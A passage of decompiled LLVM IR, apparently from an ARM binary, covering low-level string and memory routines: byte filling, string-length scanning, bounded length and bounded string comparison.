  store i32 %v8_f29c, i32* %v7_f29c, align 4
  %v9_f29c = add i32 %v0_f27054, 28
  %v10_f29c = inttoptr i32 %v9_f29c to i32*
  %v11_f29c = load i32, i32* @ip, align 4
  store i32 %v11_f29c, i32* %v10_f29c, align 4
  %v12_f29c = add i32 %v0_f27054, 32
  store i32 %v12_f29c, i32* @r3, align 4
  %v6_f2a0 = load i32, i32* %r2.global-to-local, align 4
  %v7_f2a0 = add i32 %v6_f2a0, -8
  store i32 %v7_f2a0, i32* %r2.global-to-local, align 4
  %v5_f26c = icmp slt i32 %v7_f2a0, 8
  br i1 %v5_f26c, label %dec_label_pc_f268.dec_label_pc_f2a8.loopexit_crit_edge, label %dec_label_pc_f268.dec_label_pc_f270_crit_edge

dec_label_pc_f268.dec_label_pc_f270_crit_edge:    ; preds = %dec_label_pc_f268
  %v2_f270.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_f270 = inttoptr i32 %v12_f29c to i32*
  store i32 %v2_f270.pre, i32* %v1_f270, align 4
  %v3_f270 = add i32 %v0_f27054, 36
  %v4_f270 = inttoptr i32 %v3_f270 to i32*
  %v5_f270 = load i32, i32* @ip, align 4
  store i32 %v5_f270, i32* %v4_f270, align 4
  %v6_f270 = add i32 %v0_f27054, 40
  store i32 %v6_f270, i32* @r3, align 4
  %v0_f274 = load i32, i32* %r2.global-to-local, align 4
  %v1_f274 = add i32 %v0_f274, -8
  store i32 %v1_f274, i32* %r2.global-to-local, align 4
  %v5_f27c = icmp slt i32 %v1_f274, 8
  br i1 %v5_f27c, label %dec_label_pc_f270.dec_label_pc_f2a8.loopexit_crit_edge, label %dec_label_pc_f280

dec_label_pc_f268.dec_label_pc_f2a8.loopexit_crit_edge: ; preds = %dec_label_pc_f268
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f2a8

dec_label_pc_f270.dec_label_pc_f2a8.loopexit_crit_edge: ; preds = %dec_label_pc_f268.dec_label_pc_f270_crit_edge, %dec_label_pc_f270.preheader
  %v1_f274.lcssa = phi i32 [ %v1_f27452, %dec_label_pc_f270.preheader ], [ %v1_f274, %dec_label_pc_f268.dec_label_pc_f270_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f2a8

dec_label_pc_f280.dec_label_pc_f2a8.loopexit_crit_edge: ; preds = %dec_label_pc_f280
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f2a8

dec_label_pc_f290.dec_label_pc_f2a8.loopexit_crit_edge: ; preds = %dec_label_pc_f290
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %dec_label_pc_f264, %dec_label_pc_f268.dec_label_pc_f2a8.loopexit_crit_edge, %dec_label_pc_f270.dec_label_pc_f2a8.loopexit_crit_edge, %dec_label_pc_f280.dec_label_pc_f2a8.loopexit_crit_edge, %dec_label_pc_f290.dec_label_pc_f2a8.loopexit_crit_edge, %dec_label_pc_f240
  %v0_f2b0 = phi i32 [ %v0_f244, %dec_label_pc_f240 ], [ %v1_f294, %dec_label_pc_f290.dec_label_pc_f2a8.loopexit_crit_edge ], [ %v1_f284, %dec_label_pc_f280.dec_label_pc_f2a8.loopexit_crit_edge ], [ %v1_f274.lcssa, %dec_label_pc_f270.dec_label_pc_f2a8.loopexit_crit_edge ], [ %v7_f2a0, %dec_label_pc_f268.dec_label_pc_f2a8.loopexit_crit_edge ], [ %v0_f268.pr, %dec_label_pc_f264 ]
  %v2_f2a8 = icmp eq i32 %v0_f2b0, 0
  store i1 %v2_f2a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2a8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_f2a8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_f2a8
  %v1_f2b0 = sub i32 7, %v0_f2b0
  store i32 %v1_f2b0, i32* %r2.global-to-local, align 4
  %v3_f2b4 = mul i32 %v1_f2b0, 4
  %v4_f2b4 = add i32 %v3_f2b4, ptrtoint (i32* @global_var_f2bc.380 to i32)
  call void @__pseudo_branch(i32 %v4_f2b4)
  %v0_f2bc = load i32, i32* %r1.global-to-local, align 4
  %v1_f2bc = trunc i32 %v0_f2bc to i8
  %v2_f2bc = load i32, i32* @r3, align 4
  %v3_f2bc = inttoptr i32 %v2_f2bc to i8*
  store i8 %v1_f2bc, i8* %v3_f2bc, align 1
  %v4_f2bc = load i32, i32* @r3, align 4
  %v5_f2bc = add i32 %v4_f2bc, 1
  store i32 %v5_f2bc, i32* %r3.global-to-local, align 4
  %v0_f2c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f2c0 = trunc i32 %v0_f2c0 to i8
  %v3_f2c0 = inttoptr i32 %v5_f2bc to i8*
  store i8 %v1_f2c0, i8* %v3_f2c0, align 1
  %v4_f2c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2c0 = add i32 %v4_f2c0, 1
  store i32 %v5_f2c0, i32* %r3.global-to-local, align 4
  %v0_f2c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_f2c4 = trunc i32 %v0_f2c4 to i8
  %v3_f2c4 = inttoptr i32 %v5_f2c0 to i8*
  store i8 %v1_f2c4, i8* %v3_f2c4, align 1
  %v4_f2c4 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2c4 = add i32 %v4_f2c4, 1
  store i32 %v5_f2c4, i32* %r3.global-to-local, align 4
  %v0_f2c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f2c8 = trunc i32 %v0_f2c8 to i8
  %v3_f2c8 = inttoptr i32 %v5_f2c4 to i8*
  store i8 %v1_f2c8, i8* %v3_f2c8, align 1
  %v4_f2c8 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2c8 = add i32 %v4_f2c8, 1
  store i32 %v5_f2c8, i32* %r3.global-to-local, align 4
  %v0_f2cc = load i32, i32* %r1.global-to-local, align 4
  %v1_f2cc = trunc i32 %v0_f2cc to i8
  %v3_f2cc = inttoptr i32 %v5_f2c8 to i8*
  store i8 %v1_f2cc, i8* %v3_f2cc, align 1
  %v4_f2cc = load i32, i32* %r3.global-to-local, align 4
  %v5_f2cc = add i32 %v4_f2cc, 1
  store i32 %v5_f2cc, i32* %r3.global-to-local, align 4
  %v0_f2d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f2d0 = trunc i32 %v0_f2d0 to i8
  %v3_f2d0 = inttoptr i32 %v5_f2cc to i8*
  store i8 %v1_f2d0, i8* %v3_f2d0, align 1
  %v4_f2d0 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2d0 = add i32 %v4_f2d0, 1
  store i32 %v5_f2d0, i32* %r3.global-to-local, align 4
  %v0_f2d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_f2d4 = trunc i32 %v0_f2d4 to i8
  %v3_f2d4 = inttoptr i32 %v5_f2d0 to i8*
  store i8 %v1_f2d4, i8* %v3_f2d4, align 1
  %v4_f2d4 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2d4 = add i32 %v4_f2d4, 1
  store i32 %v5_f2d4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_f270, { 1, 0 }
  uselistorder i32 %v12_f29c, { 1, 2, 0 }
  uselistorder i32 %v0_f27054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_f268.pr, { 0, 2, 1 }
  uselistorder i32 %v6_f258, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_f24c, { 1, 0 }
  uselistorder i32 %v0_f244, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f2a8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_f280, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f2e0() local_unnamed_addr {
dec_label_pc_f2e0:
  %v0_f2e0 = load i32, i32* @r0, align 4
  %v1_f2e0 = and i32 %v0_f2e0, -4
  %v1_f2e4 = inttoptr i32 %v1_f2e0 to i32*
  %v2_f2e4 = load i32, i32* %v1_f2e4, align 4
  %v1_f2e8 = urem i32 %v0_f2e0, 4
  store i32 %v1_f2e8, i32* @r3, align 4
  %v2_f2e8 = icmp eq i32 %v1_f2e8, 0
  %v1_f2ec = sub nsw i32 0, %v1_f2e8
  br i1 %v2_f2e8, label %.preheader.preheader, label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f2e0
  %v1_f2f4 = or i32 %v2_f2e4, 255
  %v7_f2f8 = icmp eq i32 %v1_f2e8, 1
  br i1 %v7_f2f8, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_f2f4
  %v9_f2fc = or i32 %v2_f2e4, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_f2f4, %bb
  %v8_f304 = phi i32 [ %v1_f2f4, %dec_label_pc_f2f4 ], [ %v9_f2fc, %bb ]
  %v1_f300 = add nsw i32 %v1_f2e8, -2
  store i32 %v1_f300, i32* @r3, align 4
  %v7_f304 = icmp eq i32 %v1_f2e8, 3
  br i1 %v7_f304, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_f304 = or i32 %v8_f304, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_f2e0
  %v1_f314.ph = phi i32 [ %v2_f2e4, %dec_label_pc_f2e0 ], [ %v9_f304, %bb34 ], [ %v8_f304, %bb33 ]
  %v1_f30838 = urem i32 %v1_f314.ph, 256
  %v2_f30839 = icmp eq i32 %v1_f30838, 0
  %v2_f30c40 = and i32 %v1_f314.ph, 65280
  %v3_f30c41 = icmp eq i32 %v2_f30c40, 0
  %or.cond42 = or i1 %v2_f30839, %v3_f30c41
  %v2_f31043 = and i32 %v1_f314.ph, 16711680
  %v3_f31044 = icmp eq i32 %v2_f31043, 0
  %or.cond3145 = or i1 %v3_f31044, %or.cond42
  %v4_f31446 = icmp ult i32 %v1_f314.ph, 16777216
  %or.cond3247 = or i1 %v4_f31446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_f324, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_f3181349 = phi i32 [ %v2_f31814, %.thread4 ], [ %v1_f2ec, %.preheader.preheader ]
  %v1_f31c48.in = phi i32 [ %v1_f31c48, %.thread4 ], [ %v1_f2e0, %.preheader.preheader ]
  %v1_f31c48 = add i32 %v1_f31c48.in, 4
  %v2_f31814 = add i32 %v1_f3181349, 4
  %v2_f31c = inttoptr i32 %v1_f31c48 to i32*
  %v3_f31c = load i32, i32* %v2_f31c, align 4
  %v1_f308 = urem i32 %v3_f31c, 256
  %v2_f308 = icmp eq i32 %v1_f308, 0
  %v2_f30c = and i32 %v3_f31c, 65280
  %v3_f30c = icmp eq i32 %v2_f30c, 0
  %or.cond = or i1 %v2_f308, %v3_f30c
  %v2_f310 = and i32 %v3_f31c, 16711680
  %v3_f310 = icmp eq i32 %v2_f310, 0
  %or.cond31 = or i1 %v3_f310, %or.cond
  %v4_f314 = icmp ult i32 %v3_f31c, 16777216
  %or.cond32 = or i1 %v4_f314, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_f324, label %.thread4

dec_label_pc_f324:                                ; preds = %.thread4, %.preheader.preheader
  %v1_f31813.lcssa = phi i32 [ %v1_f2ec, %.preheader.preheader ], [ %v2_f31814, %.thread4 ]
  %v2_f308.lcssa = phi i1 [ %v2_f30839, %.preheader.preheader ], [ %v2_f308, %.thread4 ]
  %v3_f30c.lcssa = phi i1 [ %v3_f30c41, %.preheader.preheader ], [ %v3_f30c, %.thread4 ]
  %v3_f310.lcssa = phi i1 [ %v3_f31044, %.preheader.preheader ], [ %v3_f310, %.thread4 ]
  br i1 %v2_f308.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_f324
  %v2_f328 = add i32 %v1_f31813.lcssa, 1
  br i1 %v3_f30c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_f33017 = add i32 %v1_f31813.lcssa, 2
  br i1 %v3_f310.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_f338 = add i32 %v1_f31813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_f324, %bb35, %bb36, %bb37
  %v1_f33c = phi i32 [ %v2_f328, %bb35 ], [ %v2_f33017, %bb36 ], [ %v2_f338, %bb37 ], [ %v1_f31813.lcssa, %dec_label_pc_f324 ]
  ret i32 %v1_f33c

; uselistorder directives
  uselistorder i32 %v1_f31813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_f31c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_f314.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f2e8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_f340(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f340:
  %v2_f34c = inttoptr i32 %arg2 to i8*
  %v3_f34c = call i32 @function_13f80(i8* %v2_f34c, i32 %arg1)
  ret i32 %v3_f34c
}

define i32 @function_f350() local_unnamed_addr {
dec_label_pc_f350:
  %v0_f350 = load i32, i32* @r0, align 4
  %v1_f350 = load i32, i32* @r1, align 4
  %v2_f350 = inttoptr i32 %v0_f350 to i8*
  %v3_f350 = call i32 @function_13f80(i8* %v2_f350, i32 %v1_f350)
  ret i32 %v3_f350
}

define i32 @function_f360(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f360:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_f360 = icmp eq i32 %arg2, 0
  br i1 %v2_f360, label %bb, label %dec_label_pc_f374

bb:                                               ; preds = %dec_label_pc_f360
  br label %bb25

dec_label_pc_f374:                                ; preds = %dec_label_pc_f360
  %v2_f374 = add i32 %tmp, %arg2
  %v3_f374 = icmp ult i32 %v2_f374, %tmp
  br i1 %v3_f374, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_f374
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_f374, %bb19
  %v5_f414 = phi i32 [ %v2_f374, %dec_label_pc_f374 ], [ -1, %bb19 ]
  %v1_f3944 = urem i32 %tmp, 4
  %v2_f3945 = icmp eq i32 %v1_f3944, 0
  br i1 %v2_f3945, label %dec_label_pc_f39c, label %dec_label_pc_f384

dec_label_pc_f384:                                ; preds = %bb20, %dec_label_pc_f390
  %v0_f390 = phi i32 [ %v1_f390, %dec_label_pc_f390 ], [ %tmp, %bb20 ]
  %v1_f384 = inttoptr i32 %v0_f390 to i8*
  %v2_f384 = load i8, i8* %v1_f384, align 1
  %v2_f388 = icmp eq i8 %v2_f384, 0
  br i1 %v2_f388, label %dec_label_pc_f410, label %dec_label_pc_f390

dec_label_pc_f390:                                ; preds = %dec_label_pc_f384
  %v1_f390 = add i32 %v0_f390, 1
  %v1_f394 = urem i32 %v1_f390, 4
  %v2_f394 = icmp eq i32 %v1_f394, 0
  br i1 %v2_f394, label %dec_label_pc_f39c, label %dec_label_pc_f384

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f390, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_f390, %dec_label_pc_f390 ]
  %v3_f40030 = icmp ult i32 %storemerge.lcssa, %v5_f414
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_f40030, label %dec_label_pc_f3a4, label %dec_label_pc_f410

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f3fc, %dec_label_pc_f39c
  %v0_f3f437 = phi i32 [ %v4_f3a4, %dec_label_pc_f3fc ], [ %storemerge.lcssa, %dec_label_pc_f39c ]
  %v1_f3a4 = inttoptr i32 %v0_f3f437 to i32*
  %v2_f3a4 = load i32, i32* %v1_f3a4, align 4
  %v4_f3a4 = add i32 %v0_f3f437, 4
  %v2_f3a8 = add i32 %v2_f3a4, -16843009
  %v2_f3ac = and i32 %v2_f3a8, -2139062144
  store i32 %v2_f3ac, i32* @ip, align 4
  %v2_f3b0 = icmp eq i32 %v2_f3ac, 0
  br i1 %v2_f3b0, label %dec_label_pc_f3fc, label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %dec_label_pc_f3a4
  %v2_f3b8 = inttoptr i32 %v0_f3f437 to i8*
  %v3_f3b8 = load i8, i8* %v2_f3b8, align 1
  %v2_f3bc = icmp eq i8 %v3_f3b8, 0
  br i1 %v2_f3bc, label %bb21, label %dec_label_pc_f3cc

bb21:                                             ; preds = %dec_label_pc_f3b8
  br label %dec_label_pc_f410

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f3b8
  %v1_f3cc = add i32 %v0_f3f437, 1
  %v2_f3cc = inttoptr i32 %v1_f3cc to i8*
  %v3_f3cc = load i8, i8* %v2_f3cc, align 1
  %v2_f3d0 = icmp eq i8 %v3_f3cc, 0
  br i1 %v2_f3d0, label %dec_label_pc_f410, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3cc
  %v1_f3dc = add i32 %v0_f3f437, 2
  %v2_f3dc = inttoptr i32 %v1_f3dc to i8*
  %v3_f3dc = load i8, i8* %v2_f3dc, align 1
  %v2_f3e0 = icmp eq i8 %v3_f3dc, 0
  br i1 %v2_f3e0, label %dec_label_pc_f410, label %dec_label_pc_f3ec

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3dc
  %v1_f3ec = add i32 %v0_f3f437, 3
  %v2_f3ec = inttoptr i32 %v1_f3ec to i8*
  %v3_f3ec = load i8, i8* %v2_f3ec, align 1
  %v2_f3f0 = icmp eq i8 %v3_f3ec, 0
  br i1 %v2_f3f0, label %dec_label_pc_f410, label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3ec, %dec_label_pc_f3a4
  %v3_f400 = icmp ult i32 %v4_f3a4, %v5_f414
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_f400, label %dec_label_pc_f3a4, label %dec_label_pc_f410

dec_label_pc_f410:                                ; preds = %dec_label_pc_f3fc, %dec_label_pc_f39c, %dec_label_pc_f384, %dec_label_pc_f3cc, %dec_label_pc_f3dc, %dec_label_pc_f3ec, %bb21
  %v1_f410 = phi i32 [ %v0_f3f437, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_f39c ], [ %v1_f3cc, %dec_label_pc_f3cc ], [ %v1_f3dc, %dec_label_pc_f3dc ], [ %v1_f3ec, %dec_label_pc_f3ec ], [ %v5_f414, %dec_label_pc_f3fc ], [ %v0_f390, %dec_label_pc_f384 ]
  %v3_f410 = icmp uge i32 %v5_f414, %v1_f410
  %v9_f410 = icmp eq i32 %v5_f414, %v1_f410
  %v2_f414 = xor i1 %v3_f410, true
  %v3_f414 = or i1 %v9_f410, %v2_f414
  br i1 %v3_f414, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_f410
  %v6_f414 = sub i32 %v5_f414, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_f410, %bb22
  %v5_f418 = phi i32 [ %v1_f410, %dec_label_pc_f410 ], [ %v6_f414, %bb22 ]
  %v2_f418 = xor i1 %v9_f410, true
  %v3_f418 = and i1 %v3_f410, %v2_f418
  br i1 %v3_f418, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_f418 = sub i32 %v5_f418, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_f420 = phi i32 [ 0, %bb ], [ %v5_f418, %bb23 ], [ %v6_f418, %bb24 ]
  ret i32 %v1_f420

; uselistorder directives
  uselistorder i1 %v3_f410, { 1, 0 }
  uselistorder i32 %v4_f3a4, { 1, 0 }
  uselistorder i32 %v0_f3f437, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_f390, { 1, 0, 2 }
  uselistorder i32 %v5_f414, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_f410, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_f384, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_f42c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f42c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_f42c = load i32, i32* %r2.global-to-local, align 4
  %v0_f430 = load i32, i32* %r0.global-to-local, align 4
  %tmp81 = icmp ult i32 %v0_f42c, 4
  br i1 %tmp81, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_f42c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_f42c, %bb
  %v4_f43c = phi i32 [ %v0_f430, %dec_label_pc_f42c ], [ 0, %bb ]
  br i1 %tmp81, label %.thread41, label %dec_label_pc_f444

.thread41:                                        ; preds = %bb48
  br label %dec_label_pc_f524thread-pre-split

dec_label_pc_f444:                                ; preds = %bb48
  %v3_f444 = udiv i32 %v0_f42c, 4
  %v0_f44c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f4ec, %dec_label_pc_f444
  %v0_f4ec = phi i32 [ %v1_f4ec, %dec_label_pc_f4ec ], [ %v3_f444, %dec_label_pc_f444 ]
  %v0_f488 = phi i32 [ %v1_f4e4, %dec_label_pc_f4ec ], [ %v0_f44c.pre, %dec_label_pc_f444 ]
  %v0_f484 = phi i32 [ %v1_f4dc, %dec_label_pc_f4ec ], [ %v0_f430, %dec_label_pc_f444 ]
  %v1_f448 = inttoptr i32 %v0_f484 to i8*
  %v2_f448 = load i8, i8* %v1_f448, align 1
  %v3_f448 = zext i8 %v2_f448 to i32
  store i32 %v3_f448, i32* %r0.global-to-local, align 4
  %v1_f44c = inttoptr i32 %v0_f488 to i8*
  %v2_f44c = load i8, i8* %v1_f44c, align 1
  %v3_f44c = zext i8 %v2_f44c to i32
  %v2_f450 = sub nsw i32 %v3_f448, %v3_f44c
  %v9_f450 = icmp eq i8 %v2_f448, %v2_f44c
  br i1 %v9_f450, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_f448
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_f448, %bb49
  %v1_f45c = phi i32 [ %v2_f450, %dec_label_pc_f448 ], [ 1, %bb49 ]
  %v2_f458 = icmp eq i8 %v2_f448, 0
  br i1 %v2_f458, label %.thread, label %bb51

.thread:                                          ; preds = %bb50
  br label %dec_label_pc_f530

bb51:                                             ; preds = %bb50
  %v2_f460 = icmp eq i32 %v1_f45c, 0
  br i1 %v2_f460, label %dec_label_pc_f468, label %dec_label_pc_f530

dec_label_pc_f468:                                ; preds = %bb51
  %v1_f468 = add i32 %v0_f484, 1
  %v2_f468 = inttoptr i32 %v1_f468 to i8*
  %v3_f468 = load i8, i8* %v2_f468, align 1
  %v4_f468 = zext i8 %v3_f468 to i32
  store i32 %v4_f468, i32* %r0.global-to-local, align 4
  %v1_f46c = add i32 %v0_f488, 1
  %v2_f46c = inttoptr i32 %v1_f46c to i8*
  %v3_f46c = load i8, i8* %v2_f46c, align 1
  %v4_f46c = zext i8 %v3_f46c to i32
  %v2_f470 = sub nsw i32 %v4_f468, %v4_f46c
  %v9_f470 = icmp eq i8 %v3_f468, %v3_f46c
  br i1 %v9_f470, label %bb53, label %bb52

bb52:                                             ; preds = %dec_label_pc_f468
  br label %bb53

bb53:                                             ; preds = %dec_label_pc_f468, %bb52
  %v1_f47c = phi i32 [ %v2_f470, %dec_label_pc_f468 ], [ 1, %bb52 ]
  %v2_f478 = icmp eq i8 %v3_f468, 0
  br i1 %v2_f478, label %bb54, label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %bb53, %bb54
  %v0_f480 = phi i32 [ %v1_f47c, %bb53 ], [ 1, %bb54 ]
  %v2_f480 = icmp eq i32 %v0_f480, 0
  br i1 %v2_f480, label %dec_label_pc_f490, label %dec_label_pc_f530

dec_label_pc_f490:                                ; preds = %bb55
  %v1_f490 = add i32 %v0_f484, 2
  %v2_f490 = inttoptr i32 %v1_f490 to i8*
  %v3_f490 = load i8, i8* %v2_f490, align 1
  %v4_f490 = zext i8 %v3_f490 to i32
  store i32 %v4_f490, i32* %r0.global-to-local, align 4
  %v1_f494 = add i32 %v0_f488, 2
  %v2_f494 = inttoptr i32 %v1_f494 to i8*
  %v3_f494 = load i8, i8* %v2_f494, align 1
  %v4_f494 = zext i8 %v3_f494 to i32
  %v2_f498 = sub nsw i32 %v4_f490, %v4_f494
  %v9_f498 = icmp eq i8 %v3_f490, %v3_f494
  br i1 %v9_f498, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_f490
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_f490, %bb56
  %v1_f4a4 = phi i32 [ %v2_f498, %dec_label_pc_f490 ], [ 1, %bb56 ]
  %v2_f4a0 = icmp eq i8 %v3_f490, 0
  br i1 %v2_f4a0, label %bb58, label %bb59

bb58:                                             ; preds = %bb57
  br label %bb59

bb59:                                             ; preds = %bb57, %bb58
  %v0_f4a8 = phi i32 [ %v1_f4a4, %bb57 ], [ 1, %bb58 ]
  %v2_f4a8 = icmp eq i32 %v0_f4a8, 0
  br i1 %v2_f4a8, label %dec_label_pc_f4bc, label %dec_label_pc_f534

dec_label_pc_f4bc:                                ; preds = %bb59
  %v1_f4bc = add i32 %v0_f484, 3
  %v2_f4bc = inttoptr i32 %v1_f4bc to i8*
  %v3_f4bc = load i8, i8* %v2_f4bc, align 1
  %v4_f4bc = zext i8 %v3_f4bc to i32
  store i32 %v4_f4bc, i32* %r0.global-to-local, align 4
  %v1_f4c0 = add i32 %v0_f488, 3
  %v2_f4c0 = inttoptr i32 %v1_f4c0 to i8*
  %v3_f4c0 = load i8, i8* %v2_f4c0, align 1
  %v4_f4c0 = zext i8 %v3_f4c0 to i32
  %v2_f4c4 = sub nsw i32 %v4_f4bc, %v4_f4c0
  %v9_f4c4 = icmp eq i8 %v3_f4bc, %v3_f4c0
  br i1 %v9_f4c4, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_f4bc
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_f4bc, %bb60
  %v1_f4d0 = phi i32 [ %v2_f4c4, %dec_label_pc_f4bc ], [ 1, %bb60 ]
  %v2_f4cc = icmp eq i8 %v3_f4bc, 0
  br i1 %v2_f4cc, label %bb62, label %bb63

bb62:                                             ; preds = %bb61
  br label %bb63

bb63:                                             ; preds = %bb61, %bb62
  %v0_f4d4 = phi i32 [ %v1_f4d0, %bb61 ], [ 1, %bb62 ]
  %v2_f4d4 = icmp eq i32 %v0_f4d4, 0
  %v1_f4dc = add i32 %v0_f484, 4
  %v1_f4e4 = add i32 %v0_f488, 4
  store i32 %v1_f4e4, i32* @r1, align 4
  br i1 %v2_f4d4, label %dec_label_pc_f4ec, label %dec_label_pc_f530

dec_label_pc_f4ec:                                ; preds = %bb63
  %v1_f4ec = add i32 %v0_f4ec, -1
  %v7_f4ec = icmp eq i32 %v0_f4ec, 1
  br i1 %v7_f4ec, label %dec_label_pc_f4f4, label %dec_label_pc_f448

dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4ec
  %v1_f4f4 = urem i32 %v0_f42c, 4
  store i32 %v1_f4f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f524

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f524
  %v1_f4fc = inttoptr i32 %v0_f51c to i8*
  %v2_f4fc = load i8, i8* %v1_f4fc, align 1
  %v3_f4fc = zext i8 %v2_f4fc to i32
  store i32 %v3_f4fc, i32* %r0.global-to-local, align 4
  %v0_f500 = load i32, i32* @r1, align 4
  %v1_f500 = inttoptr i32 %v0_f500 to i8*
  %v2_f500 = load i8, i8* %v1_f500, align 1
  %v3_f500 = zext i8 %v2_f500 to i32
  %v2_f504 = sub nsw i32 %v3_f4fc, %v3_f500
  %v9_f504 = icmp eq i8 %v2_f4fc, %v2_f500
  br i1 %v9_f504, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_f4fc
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_f4fc, %bb64
  %v1_f510 = phi i32 [ %v2_f504, %dec_label_pc_f4fc ], [ 1, %bb64 ]
  %v2_f50c = icmp eq i8 %v2_f4fc, 0
  br i1 %v2_f50c, label %.thread6, label %bb66

.thread6:                                         ; preds = %bb65
  br label %dec_label_pc_f530

bb66:                                             ; preds = %bb65
  %v2_f514 = icmp eq i32 %v1_f510, 0
